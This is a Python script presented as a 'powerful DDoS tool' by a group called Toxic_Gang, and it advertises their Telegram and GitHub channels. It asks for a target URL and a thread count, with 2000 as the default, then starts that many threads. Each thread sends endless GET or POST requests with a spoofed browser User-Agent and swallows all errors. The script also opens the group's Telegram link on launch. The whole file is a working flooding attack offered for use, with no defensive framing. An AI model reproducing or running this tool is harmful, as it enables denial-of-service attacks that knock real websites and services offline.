import requests
import threading
import os

###__COLOURS__###

GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;196m' 
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"

logo = (f'''{RED}
  _______        _         _____                   
 |__   __|      (_)       / ____|                  
    | | _____  ___  ___  | |  __  __ _ _ __   __ _ 
    | |/ _ \ \/ / |/ __| | | |_ |/ _` | '_ \ / _` |
    | | (_) >  <| | (__  | |__| | (_| | | | | (_| |
    |_|\___/_/\_\_|\___|  \_____|\__,_|_| |_|\__, |
                                              __/ |
                                             |___/ 
    ''')
info = (f'''{GREEN}
--------------------------------------------------------
THIS IS POWER FULL DDOS TOOL BY TOXIC_GANG
RUN ONLY CLOUD SHELL DON'T RUN ON TERMUX
Coder : Toxic_Gang
Telegram : t.me/toxic_gang_free
Github : https://github.com/Toxic-Gang
Facebook : Comming Soon
--------------------------------------------------------
''')
class Dos:

    USER_AGENT = "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1"

    def __init__(self, seq, attack_type):
        self.seq = seq
        self.attack_type = attack_type

    def run(self):
        try:
            while True:
                if self.attack_type == 1:
                    self.post_attack(Dos.url)
                elif self.attack_type == 2:
                    self.ssl_post_attack(Dos.url)
                elif self.attack_type == 3:
                    self.get_attack(Dos.url)
                elif self.attack_type == 4:
                    self.ssl_get_attack(Dos.url)
        except Exception as e:
            pass

    def check_connection(self, url):
        try:
            print("Checking Connection")
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            if response.status_code == 200:
                print("Connected to website")
            Dos.url = url
        except Exception as e:
            pass

    def ssl_check_connection(self, url):
        try:
            print("Checking Connection (ssl)")
            response = requests.get(url, headers={"User-Agent": Dos.USER_AGENT})
            if response.status_code == 200:
                print("Connected to website")
            Dos.url = url
        except Exception as e:
            pass

    def post_attack(self, url):
        try:
            data = "out of memory"
            headers = {
                "User-Agent": Dos.USER_AGENT,
                "Accept-Language": "en-US,en;"
            }
            response = requests.post(url, data=data, headers=headers)
            print(f"POST attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            pass

    def get_attack(self, url):
        try:
            headers = {
                "User-Agent": Dos.USER_AGENT
            }
            response = requests.get(url, headers=headers)
            print(f"GET attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            pass

    def ssl_post_attack(self, url):
        try:
            data = "out of memory"
            headers = {
                "User-Agent": Dos.USER_AGENT,
                "Accept-Language": "en-US,en;"
            }
            response = requests.post(url, data=data, headers=headers)
            print(f"POST attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            pass

    def ssl_get_attack(self, url):
        try:
            headers = {
                "User-Agent": Dos.USER_AGENT
            }
            response = requests.get(url, headers=headers)
            print(f"GET attack done!: {response.status_code} Thread: {self.seq}")
        except Exception as e:
            pass

if __name__ == "__main__":
    Dos.amount = 0
    Dos.url = ""
    os.system('clear')
    os.system("xdg-open https://t.me/toxic_gang_free")
    print(logo)
    print(info)
    url = input("Enter Url: ")
    print("\n")
    print("Starting Attack to url:", url)

    SUrl = url.split("://")

    print("Checking connection to Site")
    if SUrl[0] == "http" or SUrl[0] == "https":
        dos = Dos(0, 0)
        dos.check_connection(url)
    else:
        dos = Dos(0, 0)
        dos.ssl_check_connection(url)

    print("Powerfull DDoS By:Toxic_Gang")

    amount = input("Thread: ")
    if amount is None or amount == "":
        Dos.amount = 2000
    else:
        Dos.amount = int(amount)

    option = input("method: ")
    if option.lower() == "get":
        if SUrl[0] == "http" or SUrl[0] == "https":
            ioption = 3
        else:
            ioption = 4
    else:
        if SUrl[0] == "http" or SUrl[0] == "https":
            ioption = 1
        else:
            ioption = 2

    print("Starting Attack")
    threads = []
    for i in range(Dos.amount):
        t = threading.Thread(target=Dos(i, ioption).run)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
    print("Main Thread ended")
